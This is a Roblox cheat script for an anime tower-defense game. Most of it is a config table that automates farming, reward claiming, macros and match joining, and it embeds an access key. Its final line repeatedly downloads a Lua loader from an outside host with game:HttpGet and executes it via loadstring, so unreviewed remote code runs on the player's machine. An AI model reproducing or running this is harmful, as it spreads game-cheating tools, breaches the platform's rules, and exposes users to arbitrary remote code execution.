game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
getgenv().RedeemAllCode = true
getgenv().Config = {
	["AutoSave"] = true,
	["Performance"] = {
		["Delete Map"] = true,
		["Boost FPS"] = true,
		["Black Screen"] = true,
		["Delete Entities"] = true
	},
	["Portal Joiner"] = {
		["Tier Cap"] = 10,
		["Portal Reward Picker"] = {
			["Enable"] = true,
			["Prioritize"] = {
				["Shibuya Aftermath"] = 2,
				["Spider Forest"] = 1,
				["Planet Namak"] = 3
			}
		}
	},
	["Macros"] = {
		["Macro Retry Limit"] = 0,
		["Ignore Macro Timing"] = true,
		["No Ignore Sell Timing"] = true
	},
	["AutoExecute"] = true,
	["Match Finished"] = {
		["Auto Replay"] = true,
		["Replay Amount"] = 0
	},
	["Failsafe"] = {
		["Auto Rejoin"] = true
	},
	["Secure"] = {
		["Walk Around"] = true
	},
	["Legend Stage Joiner"] = {
		["Stage"] = "Golden Castle",
		["Auto Join"] = true,
		["Act"] = "Act2"
	},
	["Claimer"] = {
		["Auto Claim Quest"] = true,
		["Auto Claim Milestone"] = true,
		["Auto Claim Achievement"] = true,
		["Auto Claim Daily Reward"] = true,
		["Auto Claim Collection"] = true,
		["Auto Claim Enemy Index"] = true,
		["Auto Claim Collection Milestone"] = true
	},
	["Gameplay"] = {
		["Auto Modifier"] = {
			["Prioritize"] = {
				["Strong"] = 3,
				["Thrice"] = 4,
				["Warding off Evil"] = 24,
				["Champions"] = 99,
				["Fast"] = 1,
				["Revitalize"] = 98,
				["Exploding"] = 97,
				["Dodge"] = 10,
				["Immunity"] = 100,
				["Fisticuffs"] = 25,
				["Harvest"] = 17,
				["Slayer"] = 16,
				["Precise Attack"] = 13,
				["Planning Ahead"] = 15,
				["No Trait No Problem"] = 23,
				["Cooldown"] = 19,
				["Quake"] = 96,
				["King's Burden"] = 27,
				["Range"] = 18,
				["Common Loot"] = 21,
				["Damage"] = 20,
				["Regen"] = 7,
				["Press It"] = 14,
				["Drowsy"] = 8,
				["Shielded"] = 5,
				["Uncommon Loot"] = 22,
				["Money Surge"] = 26
			},
			["Enable"] = true,
			["Amount"] = {
				["Strong"] = 0,
				["Thrice"] = 0,
				["Warding off Evil"] = 0,
				["Champions"] = 0,
				["Fast"] = 0,
				["Revitalize"] = 0,
				["Exploding"] = 0,
				["Dodge"] = 0,
				["Immunity"] = 0,
				["Fisticuffs"] = 0,
				["Harvest"] = 0,
				["Slayer"] = 0,
				["Precise Attack"] = 0,
				["Planning Ahead"] = 0,
				["No Trait No Problem"] = 0,
				["Cooldown"] = 0,
				["Quake"] = 0,
				["King's Burden"] = 0,
				["Range"] = 0,
				["Common Loot"] = 0,
				["Damage"] = 0,
				["Regen"] = 0,
				["Press It"] = 0,
				["Drowsy"] = 0,
				["Shielded"] = 0,
				["Uncommon Loot"] = 0,
				["Money Surge"] = 0
			}
		},
		["Saber Event"] = {
			["Servant"] = "Berserker"
		},
		["Auto Vote Start"] = true,
		["Auto Sell Farm"] = {
			["Enable"] = true,
			["Wave"] = 15
		},
		["Auto Skip Wave"] = true
	},
	["Macros"] = {
		["Macro Retry Limit"] = 0,
		["Ignore Macro Timing"] = true,
		["Macro"] = "KeyGilgamesh",
		["No Ignore Sell Timing"] = true,
		["Play"] = true
	}
}
getgenv().Key = "ElIsfyTzBhioWvdmAjNPUaUaCHtnQvwH"
repeat wait(4)spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(6)until Joebiden